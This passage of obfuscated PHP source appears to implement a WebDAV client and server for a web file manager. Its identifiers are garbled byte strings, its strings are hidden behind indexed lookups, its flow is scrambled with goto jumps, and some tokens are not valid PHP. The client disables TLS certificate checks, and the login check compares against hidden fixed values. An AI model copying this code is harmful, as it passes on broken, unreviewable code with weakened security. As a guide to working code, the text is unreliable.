$CèØ‚½ğéÌ); $EÚÃ–ö«–É = array(); foreach ($Díò—à–Á¡ as $a×ËëšŠÏÀ) { if (!isset($this->_scope[$a×ËëšŠÏÀ])) { continue; } $EÚÃ–ö«–É = array_merge($EÚÃ–ö«–É, $this->_scope[$a×ËëšŠÏÀ]); } if (!empty($bˆÛÈî•‘Ö) && is_array($bˆÛÈî•‘Ö)) { $EÚÃ–ö«–É = array_merge($EÚÃ–ö«–É, $bˆÛÈî•‘Ö); } } elseif (is_array($CèØ‚½ğéÌ)) { $EÚÃ–ö«–É = $CèØ‚½ğéÌ; } if (is_array($EÚÃ–ö«–É) && !empty($EÚÃ–ö«–É)) { $this->options = array_merge($this->options, array_change_key_case($EÚÃ–ö«–É)); } return $this; } public function where($aÛ—¶Êï¢‰, $eÍ´‡ÃŒÎ = null) { $c…Â«à“– =& $_SERVER[»„]; if (!is_null($eÍ´‡ÃŒÎ) && is_string($aÛ—¶Êï¢‰)) { if (!is_array($eÍ´‡ÃŒÎ)) { $eÍ´‡ÃŒÎ = func_get_args(); array_shift($eÍ´‡ÃŒÎ); } $eÍ´‡ÃŒÎ = array_map(array($this->db, $c…Â«à“–[327]), $eÍ´‡ÃŒÎ); $aÛ—¶Êï¢‰ = vsprintf($aÛ—¶Êï¢‰, $eÍ´‡ÃŒÎ); } elseif (is_object($aÛ—¶Êï¢‰)) { $aÛ—¶Êï¢‰ = get_object_vars($aÛ—¶Êï¢‰); } elseif (is_array($aÛ—¶Êï¢‰)) { foreach ($aÛ—¶Êï¢‰ as $a‚áÍç„„„ => $A­Œğ Ş») { if ((is_numeric($a‚áÍç„„„) || !$a‚áÍç„„„) && is_string($A­Œğ Ş»)) { think_trace($c…Â«à“–[334], $c…Â«à“–[33], $c…Â«à“–[46]); die; } } } if (is_string($aÛ—¶Êï¢‰) && $c…Â«à“–[33] != $aÛ—¶Êï¢‰) { $A‡˜ó¡–§ = array(); $A‡˜ó¡–§[$c…Â«à“–[335]] = $aÛ—¶Êï¢‰; $aÛ—¶Êï¢‰ = $A‡˜ó¡–§; } if (isset($this->options[$c…Â«à“–[259]])) { $this->options[$c…Â«à“–[259]] = array_merge($this->options[$c…Â«à“–[259]], $aÛ—¶Êï¢‰); } else { $this->options[$c…Â«à“–[259]] = $aÛ—¶Êï¢‰; } return $this; } public function limit($AÃ»‚Éšæ, $b…§Ç×ƒôà = null) { $D®Ü©¦ª¥Ù =& $_SERVER[»„]; $this->options[$D®Ü©¦ª¥Ù[276]] = is_null($b…§Ç×ƒôà) ? $AÃ»‚Éšæ : $AÃ»‚Éšæ . $D®Ü©¦ª¥Ù[47] . $b…§Ç×ƒôà; return $this; } public function page($aÂÉ­íÉŒ», $fÃœè¦ùÔ‚ = null) { $C…˜ÖÙ…İ— =& $_SERVER[»„]; $this->options[$C…˜ÖÙ…İ—[336]] = is_null($fÃœè¦ùÔ‚) ? $aÂÉ­íÉŒ» : $aÂÉ­íÉŒ» . $C…˜ÖÙ…İ—[47] . $fÃœè¦ùÔ‚; return $this; } public function comment($FÏ“İ’¨Æ ) { $this->options[$_SERVER[»„][337]] = $FÏ“İ’¨Æ ; return $this; } public function setProperty($C¾¥£¶‘ãÓ, $cÒ¼âàšÈ«) { if (property_exists($this, $C¾¥£¶‘ãÓ)) { $this->{$C¾¥£¶‘ãÓ} = $cÒ¼âàšÈ«; } return $this; } } goto FÀ«•óêÑÁ; B–²ßø¤…Ê: class HttpDavClient { public function __construct($A–×Õ¯¡ô, $bŒ¢¯˜œº‚, $Bµ¡ŠÁâÏ–) { $this->header = array(); $this->userName = $bŒ¢¯˜œº‚; $this->userPassowrd = $Bµ¡ŠÁâÏ–; } protected function makePath($dÛÃŸ¿Š—) { return $dÛÃŸ¿Š—; } protected function setHeader($BíôÖ‡çˆĞ, $Aé—…Ğ˜  = false) { if ($Aé—…Ğ˜  === !1) { $this->header[] = $BíôÖ‡çˆĞ; } else { $this->header[] = $BíôÖ‡çˆĞ . $_SERVER[»„][870] . $Aé—…Ğ˜ ; } } public function move($Cáò•í…öˆ, $bçÊ‰¤¿Ÿ, $aåÍˆéâˆç = '') { $A©¦„İ‰ïä =& $_SERVER[»„]; $this->setHeader($A©¦„İ‰ïä[1737], $this->makePath($bçÊ‰¤¿Ÿ)); $this->setHeader($A©¦„İ‰ïä[1738], $A©¦„İ‰ïä[1739]); if ($aåÍˆéâˆç) { $this->setHeader($A©¦„İ‰ïä[1740], $A©¦„İ‰ïä[915] . $aåÍˆéâˆç . $A©¦„İ‰ïä[918]); } return $this->send($A©¦„İ‰ïä[1741], $Cáò•í…öˆ); } public function copy($b¼ÚÉ‚ƒ¹Ó, $eŒÊ˜ Æ»‚) { $A§ª‚«¤‘È =& $_SERVER[»„]; $this->setHeader($A§ª‚«¤‘È[1737], $this->makePath($eŒÊ˜ Æ»‚)); $this->setHeader($A§ª‚«¤‘È[1738], $A§ª‚«¤‘È[1739]); return $this->send($A§ª‚«¤‘È[1742], $b¼ÚÉ‚ƒ¹Ó); } public function mkcol($D¦â¹íïÓ) { $e‰Á‘÷½¢™ =& $_SERVER[»„]; $this->setHeader($e‰Á‘÷½¢™[1738], $e‰Á‘÷½¢™[1739]); return $this->send($e‰Á‘÷½¢™[1743], $D¦â¹íïÓ); } public function delete($Aª½ ´ŠÙ, $A‹Î†ÛŠÉ = '') { $Fš«òàÖÚ¾ =& $_SERVER[»„]; if ($A‹Î†ÛŠÉ) { $this->setHeader($Fš«òàÖÚ¾[1740], $Fš«òàÖÚ¾[915] . $A‹Î†ÛŠÉ . $Fš«òàÖÚ¾[918]); } return $this->send($Fš«òàÖÚ¾[1231], $Aª½ ´ŠÙ); } public function propfind($D“â”±·´…) { $eÒÄ†íœÄÖ =& $_SERVER[»„]; $this->setHeader($eÒÄ†íœÄÖ[1744], $eÒÄ†íœÄÖ[83]); $this->setHeader($eÒÄ†íœÄÖ[1745], $eÒÄ†íœÄÖ[1746]); $dâä® = $eÒÄ†íœÄÖ[1747]; return $this->send($eÒÄ†íœÄÖ[1748], $D“â”±·´…, $dâä®); } public function options($d¨Î×°¦ëÂ) { return $this->send($_SERVER[»„][1749], $d¨Î×°¦ëÂ); } public function get($bÊ³è«Õ „) { return $this->send($_SERVER[»„][212], $bÊ³è«Õ „); } public function put($fÚé®ôßêï, $d˜˜ñ·ÎĞ, $aÜá‚«‚Ö¹ = '') { $EãØç…™­à =& $_SERVER[»„]; if ($aÜá‚«‚Ö¹) { $this->setHeader($EãØç…™­à[1740], $EãØç…™­à[915] . $aÜá‚«‚Ö¹ . $EãØç…™­à[918]); } return $this->send($EãØç…™­à[210], $fÚé®ôßêï, $d˜˜ñ·ÎĞ); } protected function send($Cí…ŠÙ†ô„, $eöÉÖùšÍå, $Dø´ïÔ˜í = false, $DÙ®’„ËÖ = false) { goto aˆôØØ¼; f‹Í¬ÉÇ«„: $this->header = array(); return $D«´Ú‡×¹¥; goto Cƒ†’‡“¼; eƒÎ½Ô›¯Û: $C·†î Ä© = curl_init($eöÉÖùšÍå); curl_setopt($C·†î Ä©, CURLOPT_CUSTOMREQUEST, $Cí…ŠÙ†ô„); curl_setopt($C·†î Ä©, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto eÁ£ˆŸøôô; aˆôØØ¼: $c‘Ïé“‹ =& $_SERVER[»„]; $f“î†ìîŸí = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($c‘Ïé“‹[1750], $c‘Ïé“‹[50]); goto DÎÎøéÖåœ; eÁ£ˆŸøôô: curl_setopt($C·†î Ä©, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C·†î Ä©, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C·†î Ä©, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto bİ±ô‘¹ïŠ; bİ±ô‘¹ïŠ: curl_setopt($C·†î Ä©, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C·†î Ä©, CURLOPT_SSL_VERIFYHOST, !1); $D«´Ú‡×¹¥ = curl_exec($C·†î Ä©); goto f‹Í¬ÉÇ«„; DÎÎøéÖåœ: $this->setHeader($f“î†ìîŸí); if ($Dø´ïÔ˜í) { $Dø´ïÔ˜í = $c‘Ïé“‹[1751] . $Dø´ïÔ˜í; } if (!request_url_safe($eöÉÖùšÍå)) { return !1; } goto eƒÎ½Ô›¯Û; Cƒ†’‡“¼: } } class HttpDavServer { public function __construct($fÚçÌËğ—‰, $DêéŸê¥¬¸) { $this->root = $fÚçÌËğ—‰; $this->initPath($DêéŸê¥¬¸); $this->start(); } public function initPath($AÇê¡»Ñİ·) { $aæ¼„œâø =& $_SERVER[»„]; $cò‘™ÎÖï = rtrim($_SERVER[$aæ¼„œâø[1360]], $aæ¼„œâø[8]) . $aæ¼„œâø[8]; $this->urlBase = substr($cò‘™ÎÖï, 0, strpos($cò‘™ÎÖï, $AÇê¡»Ñİ·) + 1); $this->urlBase = rtrim($this->urlBase, $aæ¼„œâø[8]) . $AÇê¡»Ñİ·; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $Dã¦â’Çµë =& $_SERVER[»„]; $DÂÑç¿Â¤ = HttpAuth::get(); if ($DÂÑç¿Â¤[$Dã¦â’Çµë[531]] == $Dã¦â’Çµë[1752] && $DÂÑç¿Â¤[$Dã¦â’Çµë[887]] == $Dã¦â’Çµë[1753]) { return !0; } HttpAuth::error(); } public function start() { goto dåÉŒƒÁ‹Ÿ; dåÉŒƒÁ‹Ÿ: $b¡‡‡ÆŠ =& $_SERVER[»„]; $this->checkUser(); $Câß“ë©Û = $b¡‡‡ÆŠ[142] . HttpHeader::method(); goto C¦ì´è¸; C¦ì´è¸: if (!method_exists($this, $Câß“ë©Û)) { pr($Câß“ë©Û . $b¡‡‡ÆŠ[1754]); die; } $EĞ„®ì“ = array($b¡‡‡ÆŠ[1755], $b¡‡‡ÆŠ[1756]); if (!in_array($Câß“ë©Û, $EĞ„®ì“) && !$this->pathExists($this->path)) { $fÅàõ˜ğ² = array($b¡‡‡ÆŠ[1020] => 404); } else { $fÅàõ˜ğ² = $this->{$Câß“ë©Û}(); } goto Cè™µà¾; Cè™µà¾: if (!$fÅàõ˜ğ²) { return; } self::response($fÅàõ˜ğ²); goto e›£ß®Ö¡À; e›£ß®Ö¡À: } public function pathGet($A¦ø®‰ƒòò = false) { $AªÕ¦«¥Ÿ =& $_SERVER[»„]; $Cİö³êùç = $A¦ø®‰ƒòò ? $_SERVER[$AªÕ¦«¥Ÿ[1757]] : $_SERVER[$AªÕ¦«¥Ÿ[1360]]; $Cİö³êùç = KodIO::clear(rawurldecode($Cİö³êùç)); if (!strstr($Cİö³êùç, KodIO::clear($this->urlBase))) { return !1; } return substr($Cİö³êùç, strpos($Cİö³êùç, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($cêÕÎ†½’Ï) { return file_exists($cêÕÎ†½’Ï); } public function pathMkdir($båÔˆİñ¨˜) { return mkdir($båÔˆİñ¨˜, 511, !0); } public function pathInfo($F´ãáÅˆñá) { return path_info($F´ãáÅˆñá); } public function pathList($FÕ¶Ş¯ÄÏ) { return path_list($FÕ¶Ş¯ÄÏ); } public function pathOut($B´Å¨°È¯Ã) { echo file_get_contents($B´Å¨°È¯Ã); } public function pathPut($a¸êá±ƒùÊ, $Dø‡ä±‘ë» = '') { if (!$Dø‡ä±‘ë») { return file_put_contents($a¸êá±ƒùÊ, $_SERVER[»„][33]); } return move_path($Dø‡ä±‘ë», $a¸êá±ƒùÊ); } public function pathRemove($E‰éì…Êƒ¾) { if (is_file($E‰éì…Êƒ¾)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Bøˆâœí‘, $a†¦ÂØ¹ù) { return move_path($Bøˆâœí‘, $a†¦ÂØ¹ù); } public function pathCopy($CÏÑ›èËÇğ, $A®¼ ©ö‹ñ) { return copy_dir($CÏÑ›èËÇğ, $A®¼ ©ö‹ñ); } public function parsePath($d¨òê¸¦´) { return $d¨òê¸¦´; } public function parseItem($BŠèí²£, $D¶áƒ‚ñœ—) { goto D¹³ïÎÖ; C…›¨Ë¡¨: $D¢ÈŠßÉŸ² = array($d†Šî“Â¾[1758] => KodIO::clear($this->urlBase . $fô§öéß¾), $d†Šî“Â¾[106] => @gmdate($d†Šî“Â¾[1759], $BŠèí²£[$d†Šî“Â¾[106]]), $d†Šî“Â¾[183] => @gmdate($d†Šî“Â¾[1760], $BŠèí²£[$d†Šî“Â¾[183]]), $d†Šî“Â¾[77] => $BŠèí²£[$d†Šî“Â¾[77]] ? $BŠèí²£[$d†Šî“Â¾[77]] : 0); return $D¢ÈŠßÉŸ²; goto a›Óè…µİô; D¹³ïÎÖ: $d†Šî“Â¾ =& $_SERVER[»„]; $fô§öéß¾ = $this->pathGet() . $d†Šî“Â¾[8] . $BŠèí²£[$d†Šî“Â¾[28]]; $fô§öéß¾ = $d†Šî“Â¾[8] . str_replace($d†Šî“Â¾[168], $d†Šî“Â¾[8], rawurlencode($fô§öéß¾)); goto a÷¢ÑˆŠÄ; a÷¢ÑˆŠÄ: if ($D¶áƒ‚ñœ—) { $fô§öéß¾ = $d†Šî“Â¾[8] . str_replace($d†Šî“Â¾[168], $d†Šî“Â¾[8], rawurlencode($this->pathGet())); } if (!trim($BŠèí²£[$d†Šî“Â¾[106]])) { $BŠèí²£[$d†Šî“Â¾[106]] = time(); } if (!trim($BŠèí²£[$d†Šî“Â¾[183]])) { $BŠèí²£[$d†Šî“Â¾[183]] = time(); } goto C…›¨Ë¡¨; a›Óè…µİô: } public function parseItemXml($c¶··äóƒ, $aâˆÒˆå‹Î) { $a„÷×“Ñ…Œ =& $_SERVER[»„]; $b¶ÆÇŒØáë = $this->parseItem($c¶··äóƒ, $aâˆÒˆå‹Î); if ($c¶··äóƒ[$a„÷×“Ñ…Œ[29]] == $a„÷×“Ñ…Œ[76]) { $FØœ¶ŒÄ™Ò = $a„÷×“Ñ…Œ[1761]; $FØœ¶ŒÄ™Ò .= $a„÷×“Ñ…Œ[1762]; } else { $DÊ¾ˆ³é—Ğ = $c¶··äóƒ[$a„÷×“Ñ…Œ[156]] ? $c¶··äóƒ[$a„÷×“Ñ…Œ[156]] : get_path_ext($c¶··äóƒ[$a„÷×“Ñ…Œ[28]]); $F¬ÀÆ¬ = get_file_mime($DÊ¾ˆ³é—Ğ); $FØœ¶ŒÄ™Ò = $a„÷×“Ñ…Œ[1763]; $FØœ¶ŒÄ™Ò .= "\x3c\x44\72\x67\145\164\x63\x6f\156\164\145\156\x74\164\171\x70\x65\76{$F¬ÀÆ¬}\74\x2f\x44\72\147\x65\164\143\157\156\164\145\x6e\x74\x74\171\x70\x65\76"; } return "\xa\x9\11\x3c\104\72\x72\x65\163\x70\x6f\156\163\145\76\xa\11\11\x9\x3c\104\x3a\150\x72\x65\x66\x3e{$b¶ÆÇŒØáë[$a„÷×“Ñ…Œ[1758]]}\74\x2f\x44\x3a\150\x72\x65\x66\76\12\x9\11\11\x3c\104\72\160\x72\x6f\x70\163\164\141\x74\x3e\xa\11\11\11\x9\74\104\x3a\x70\162\x6f\160\x3e\xa\11\x9\x9\11\x9\74\x44\72\147\145\x74\x6c\141\163\164\155\x6f\x64\x69\146\x69\145\144\76{$b¶ÆÇŒØáë[$a„÷×“Ñ…Œ[106]]}\74\57\x44\72\147\x65\x74\x6c\x61\x73\164\x6d\157\x64\x69\x66\x69\145\144\x3e\12\x9\11\x9\x9\x9\x3c\x44\72\143\x72\145\141\x74\x69\x6f\156\x64\x61\164\145\76{$b¶ÆÇŒØáë[$a„÷×“Ñ…Œ[183]]}\74\x2f\x44\72\x63\x72\x65\x61\164\151\x6f\156\144\x61\164\145\x3e\12\x9\x9\x9\11\x9\74\x44\72\x67\145\x74\143\x6f\156\x74\145\x6e\164\x6c\x65\x6e\147\164\150\x3e{$b¶ÆÇŒØáë[$a„÷×“Ñ…Œ[77]]}\74\x2f\104\72\x67\x65\164\x63\157\156\x74\x65\x6e\164\x6c\145\x6e\x67\x74\150\76\xa\x9\11\11\x9\x9{$FØœ¶ŒÄ™Ò}\xa\x9\x9\11\x9\74\x2f\104\72\x70\x72\157\160\76\12\x9\x9\x9\11\74\x44\72\x73\164\141\164\165\163\76\x48\x54\124\x50\x2f\x31\x2e\x31\x20\62\60\x30\40\117\x4b\74\x2f\x44\x3a\x73\164\141\x74\165\x73\76\xa\11\x9\11\x3c\x2f\104\72\x70\x72\x6f\160\163\x74\141\x74\76\12\x9\11\x3c\x2f\104\x3a\x72\145\163\160\157\156\163\145\76"; } public function pathListMerge($aŠšôíˆ”‰) { goto DƒªÑ›è™; DƒªÑ›è™: $F•´²ãš® =& $_SERVER[»„]; if (!$aŠšôíˆ”‰) { return $aŠšôíˆ”‰; } $BÑ‡í•Ç = array($F•´²ãš®[73], $F•´²ãš®[74], $F•´²ãš®[1764]); goto ağïµÍº; ağïµÍº: $A”¨ØôŸ¬ó = array(); foreach ($aŠšôíˆ”‰ as $F–ø˜®«Û½ => $d¨»ŞçÇ…¶) { if (!in_array($F–ø˜®«Û½, $BÑ‡í•Ç) || !is_array($d¨»ŞçÇ…¶)) { continue; } $A”¨ØôŸ¬ó = array_merge($A”¨ØôŸ¬ó, $d¨»ŞçÇ…¶); } foreach ($A”¨ØôŸ¬ó as &$cÅÎ•´¸¸Œ) { $cÅÎ•´¸¸Œ[$F•´²ãš®[28]] = str_replace($F•´²ãš®[8], $F•´²ãš®[1362], $cÅÎ•´¸¸Œ[$F•´²ãš®[28]]); } goto e”¹Š¿ßËø; e”¹Š¿ßËø: return $A”¨ØôŸ¬ó; goto eÕƒäßŸ; eÕƒäßŸ: } public function httpPROPFIND() { goto eäŞ±ù¥è; DÙé„ŒŸ­ù: return array($aÈÎŠÚÖ»ö[1767] => 207, $aÈÎŠÚÖ»ö[1768] => "\x3c\104\x3a\155\x75\154\x74\151\163\164\x61\x74\x75\163\x20\170\155\x6c\156\x73\x3a\104\75\42\104\101\x56\72\x22\x3e\12{$CŠÈ»’Ú¥×}\xa\x3c\57\104\x3a\x6d\x75\154\x74\x69\163\x74\141\x74\x75\163\x3e"); goto D©ÌÛ§øùÓ; E®“ïòÓ°Ë: if ($BáóËæáó‰) { $cÇ¤Ö•¾Ú = array($dïšÜí­ÛÆ); } else { $dïšÜí­ÛÆ[$aÈÎŠÚÖ»ö[28]] = $aÈÎŠÚÖ»ö[33]; $cÇ¤Ö•¾Ú = array_merge(array($dïšÜí­ÛÆ), $cÇ¤Ö•¾Ú); } $CŠÈ»’Ú¥× = $aÈÎŠÚÖ»ö[33]; foreach ($cÇ¤Ö•¾Ú as $e‹¡¤İŞÈ‹) { $CŠÈ»’Ú¥× .= $this->parseItemXml($e‹¡¤İŞÈ‹, $BáóËæáó‰); } goto DÙé„ŒŸ­ù; eäŞ±ù¥è: $aÈÎŠÚÖ»ö =& $_SERVER[»„]; $Dìß½æ™‘ = $this->pathList($this->path); $cÇ¤Ö•¾Ú = $this->pathListMerge($Dìß½æ™‘); goto fŠ‡°£Ñ’; fŠ‡°£Ñ’: $dïšÜí­ÛÆ = $Dìß½æ™‘[$aÈÎŠÚÖ»ö[1765]]; if (!is_array($cÇ¤Ö•¾Ú) || $dïšÜí­ÛÆ[$aÈÎŠÚÖ»ö[1766]] === !1) { return array($aÈÎŠÚÖ»ö[1767] => 404, $aÈÎŠÚÖ»ö[1768] => $aÈÎŠÚÖ»ö[1769]); } $BáóËæáó‰ = $dïšÜí­ÛÆ[$aÈÎŠÚÖ»ö[29]] == $aÈÎŠÚÖ»ö[163] || HttpHeader::get($aÈÎŠÚÖ»ö[1744]) == $aÈÎŠÚÖ»ö[464]; goto E®“ïòÓ°Ë; D©ÌÛ§øùÓ: } public function httpHEAD() { $c§—ª²µé½ =& $_SERVER[»„]; $EÛÑÈÇööö = $this->pathInfo($this->path); if (!$EÛÑÈÇööö || $EÛÑÈÇööö[$c§—ª²µé½[29]] == $c§—ª²µé½[76]) { return array($c§—ª²µé½[1020] => 200, $c§—ª²µé½[1187] => array($c§—ª²µé½[1770])); } return array($c§—ª²µé½[1020] => 200, $c§—ª²µé½[1187] => array($c§—ª²µé½[1771], $c§—ª²µé½[135], $c§—ª²µé½[1772] . $EÛÑÈÇööö[$c§—ª²µé½[77]], $c§—ª²µé½[1773] . get_file_mime($EÛÑÈÇööö[$c§—ª²µé½[156]]), $c§—ª²µé½[131] . gmdate($c§—ª²µé½[1759], $EÛÑÈÇööö[$c§—ª²µé½[1234]]) . $c§—ª²µé½[1774], $c§—ª²µé½[1775])); } public function httpOPTIONS() { $cÁ›—ËÓ° =& $_SERVER[»„]; return array($cÁ›—ËÓ°[1020] => 200, $cÁ›—ËÓ°[1187] => array($cÁ›—ËÓ°[1776], $cÁ›—ËÓ°[1777], $cÁ›—ËÓ°[1778], $cÁ›—ËÓ°[1243])); } public function httpPROPPATCH() { $EĞĞ®®± =& $_SERVER[»„]; $B—Ùí¦ = $EĞĞ®®±[1779] . $_SERVER[$EĞĞ®®±[1360]] . $EĞĞ®®±[1780]; return array($EĞĞ®®±[1767] => 207, $EĞĞ®®±[1768] => "\x3c\104\x3a\155\x75\x6c\x74\151\x73\164\x61\x74\165\x73\x20\x78\x6d\154\x6e\x73\72\104\x3d\x22\x44\101\x56\72\x22\76\xa{$B—Ùí¦}\12\74\57\104\72\x6d\165\x6c\x74\151\163\x74\141\164\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $F½Œ¡éÕÉ =& $_SERVER[»„]; $E‰Ùù’éé‚ = $this->uploadFile(); if ($E‰Ùù’éé‚) { $Aã¢—£”Ó‹ = 204; } else { $E‰Ùù’éé‚ = $F½Œ¡éÕÉ[33]; $Aã¢—£”Ó‹ = 201; } $fÅ¸ÃÄƒ‹í = $this->pathPut($this->path, $E‰Ùù’éé‚); if ($fÅ¸ÃÄƒ‹í == !1) { $Aã¢—£”Ó‹ = 404; } return array($F½Œ¡éÕÉ[1767] => $Aã¢—£”Ó‹); } private function uploadFile() { goto aì„µ®Àç; aç—œ…«ˆ: $dµäŞØæ™Ê = @fopen($Cïƒ‹¸ËÈ–, $f‘»ã­¸®¿[1489]); $cİ‰¤¢ùÓ = @fopen($f‘»ã­¸®¿[1782], $f‘»ã­¸®¿[1488]); if (!$cİ‰¤¢ùÓ || !$dµäŞØæ™Ê) { @unlink($Cïƒ‹¸ËÈ–); return !1; } goto CÓæ¢ğìÎ; e³èÀ®à£‡: if (@filesize($Cïƒ‹¸ËÈ–) > 0) { return $Cïƒ‹¸ËÈ–; } @unlink($Cïƒ‹¸ËÈ–); return !1; goto fñ•äÓù°; CÓæ¢ğìÎ: while (!feof($cİ‰¤¢ùÓ)) { fwrite($dµäŞØæ™Ê, fread($cİ‰¤¢ùÓ, 1024 * 200)); } fclose($cİ‰¤¢ùÓ); fclose($dµäŞØæ™Ê); goto e³èÀ®à£‡; aì„µ®Àç: $f‘»ã­¸®¿ =& $_SERVER[»„]; @mk_dir(TEMP_FILES); $Cïƒ‹¸ËÈ– = TEMP_FILES . $f‘»ã­¸®¿[1781] . rand_string(32); goto aç—œ…«ˆ; fñ•äÓù°: } public function httpMKCOL() { $AóºÊ¿ËÆ» =& $_SERVER[»„]; if ($this->pathExists($this->path)) { return array($AóºÊ¿ËÆ»[1020] => 409); } $C¾ï‰Òª¡ = $this->pathMkdir($this->path); return array($AóºÊ¿ËÆ»[1020] => $C¾ï‰Òª¡ ? 201 : 403); } public function httpMOVE() { $Bà¢‰§‡¸™ =& $_SERVER[»„]; $DÒØ—Û…İ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Bà¢‰§‡¸™[1783]])) { $BÂ…ÁºØª[$Bà¢‰§‡¸™[1784]] = $_SERVER[$Bà¢‰§‡¸™[1783]] == $Bà¢‰§‡¸™[1785]; } $EÒ…ïøÕ = $this->pathMove($this->path, $DÒØ—Û…İ); return array($Bà¢‰§‡¸™[1020] => $EÒ…ïøÕ ? 201 : 404); } public function httpCOPY() { $C™Òß”ó ‡ = $this->parsePath($this->pathGet(!0)); $cïÜ‚‹Î±± = $this->pathCopy($this->path, $C™Òß”ó ‡); return array($_SERVER[»„][1020] => $cïÜ‚‹Î±± ? 201 : 404); } public function httpDELETE() { $cæÃæİÎÖ = $this->pathRemove($this->path); return array($_SERVER[»„][1020] => $cæÃæİÎÖ ? 200 : 503); } public function httpLOCK() { $cÍ‹Ğ•ï¥Ä =& $_SERVER[»„]; $A‰¢ëÑĞ“ = md5($this->path); $f¸ùµõÜè  = $cÍ‹Ğ•ï¥Ä[1786] . $this->xmlGet($cÍ‹Ğ•ï¥Ä[1787]) . $cÍ‹Ğ•ï¥Ä[1788] . $A‰¢ëÑĞ“ . $cÍ‹Ğ•ï¥Ä[1789]; return array($cÍ‹Ğ•ï¥Ä[1020] => 200, $cÍ‹Ğ•ï¥Ä[1187] => array($cÍ‹Ğ•ï¥Ä[1790] . $A‰¢ëÑĞ“, $cÍ‹Ğ•ï¥Ä[1791]), $cÍ‹Ğ•ï¥Ä[1792] => $f¸ùµõÜè ); } public function httpUNLOCK() { return array($_SERVER[»„][1020] => 204); } public function xmlGet($F‹¬š˜ãÍ) { goto cŞ• İ´ÒÇ; CÏÜÁË…ƒ†: $fêÂ³ğğ‹ = array_shift(explode($A‚¢®‡–Éñ[8], $F‹¬š˜ãÍ)); $e¤ÀòëÉ½˜ = $A ˆ‡Š°Ø->getElementsByTagNameNS($A‚¢®‡–Éñ[1794], $fêÂ³ğğ‹); if ($e¤ÀòëÉ½˜) { return $e¤ÀòëÉ½˜[0]->nodeValue; } goto BèçŸ¾ÁÃ; BèçŸ¾ÁÃ: return $A‚¢®‡–Éñ[33]; goto AÂ×ÓÏàôƒ; cŞ• İ´ÒÇ: $A‚¢®‡–Éñ =& $_SERVER[»„]; static $A ˆ‡Š°Ø = false; if (!$A ˆ‡Š°Ø) { $DùƒÍˆ = file_get_contents($A‚¢®‡–Éñ[1793]); $A ˆ‡Š°Ø = new DOMDocument(); $A ˆ‡Š°Ø->loadXML($DùƒÍˆ); } goto CÏÜÁË…ƒ†; AÂ×ÓÏàôƒ: } public static function response($Cš³‡ŒÈÆÙ) { goto a¹òÙæ­†–; a¹òÙæ­†–: $eÀìÈ®¼Öô =& $_SERVER[»„]; $dëº¡åÖ— = is_array($Cš³‡ŒÈÆÙ[$eÀìÈ®¼Öô[1187]]) ? $Cš³‡ŒÈÆÙ[$eÀìÈ®¼Öô[1187]] : array(); $dëº¡åÖ—[] = HttpHeader::code($Cš³‡ŒÈÆÙ[$eÀìÈ®¼Öô[1020]]); goto cĞÍŠ·º˜ö; cĞÍŠ·º˜ö: $dëº¡åÖ—[] = $eÀìÈ®¼Öô[1734]; $dëº¡åÖ—[] = $eÀìÈ®¼Öô[1735]; foreach ($dëº¡åÖ— as $eÔÉÂôöé¥) { header($eÔÉÂôöé¥); } goto DˆÀÛ‡¹å¢; DˆÀÛ‡¹å¢: if (is_string($Cš³‡ŒÈÆÙ[$eÀìÈ®¼Öô[1792]])) { header($eÀìÈ®¼Öô[1795]); $E´˜âÙ‚‘¯ = $eÀìÈ®¼Öô[1796] . $eÀìÈ®¼Öô[213] . $Cš³‡ŒÈÆÙ[$eÀìÈ®¼Öô[1792]]; echo $E´˜âÙ‚‘¯; } goto C•Ö²¯Œ¥‡; C•Ö²¯Œ¥‡: } } class HttpHeader { public static $_headers = array("\110\157\163\164" => "\110\124\x54\120\137\110\x4f\x53\124", "\125\x73\x65\162\x2d\x41\147\x65\x6e\164" => "\110\x54\x54\x50\137\125\x53\105\x52\137\101\x47\x45\116\124", "\103\157\x6e\164\x65\x6e\x74\x2d\124\x79\x70\x65" => "\x48\124\x54\120\x5f\x43\x4f\116\x54\x45\116\124\137\x54\x59\120\x45", "\x43\x6f\x6e\x74\145\x6e\x74\x2d\x4c\x65\x6e\147\x74\150" => "\110\x54\x54\x50\137\x43\x4f\116\x54\x45\116\124\x5f\114\105\x4e\107\124\x48", "\x44\x65\x70\x74\150" => "\x48\124\x54\x50\137\x44\x45\120\x54\x48", "\x45\x78\160\x65\x63\x74" => "\110\124\124\120\x5f\x45\x58\x50\x45\x43\x54", "\x49\146\x2d\x4e\157\x6e\145\55\115\141\164\x63\x68" => "\110\x54\x54\x50\137\x49\106\137\x4e\x4f\x4e\x45\x5f\x4d\x41\x54\103\x48", "\x49\146\55\x4d\141\x74\x63\x68" => "\x48\124\x54\x50\137\x49\x46\137\x4d\101\124\x43\x48", "\111\x66\x2d\x52\141\156\147\x65" => "\x48\124\x54\x50\137\111\106\137\122\x41\x4e\x47\105", "\x4c\141\163\x74\55\x4d\x6f\144\x69\x66\151\145\x64" => "\110\124\x54\120\137\114\101\123\124\x5f\x4d\117\x44\x49\x46\111\x45\104", "\111\146\55\x4d\157\144\x69\x66\x69\145\x64\55\x53\x69\156\x63\x65" => "\x48\124\124\120\x5f\111\106\x5f\115\x4f\104\x49\106\x49\x45\x44\x5f\x53\x49\x4e\x43\x45", "\111\146\55\x55\156\155\x6f\x64\x69\x66\x69\x65\144\x2d\x53\151\x6e\x63\145" => "\110\124\x54\x50\x5f\x49\106\137\x55\x4e\115\x4f\x44\111\x46\111\x45\x44\137\x53\111\x4e\x43\105", "\x52\141\156\147\x65" => "\x48\124\x54\x50\x5f\122\101\116\107\x45", "\124\x69\155\145\x6f\165\164" => "\110\x54\x54\x50\137\x54\111\115\x45\117\x55\124", "\111\x66" => "\110\x54\x54\120\x5f\x49\106", "\x4c\x6f\143\153\55\124\x6f\153\x65\156" => "\x48\124\124\120\137\x4c\117\x43\x4b\137\x54\117\x4b\x45\x4e", "\x4f\x76\x65\162\x77\x72\151\x74\145" => 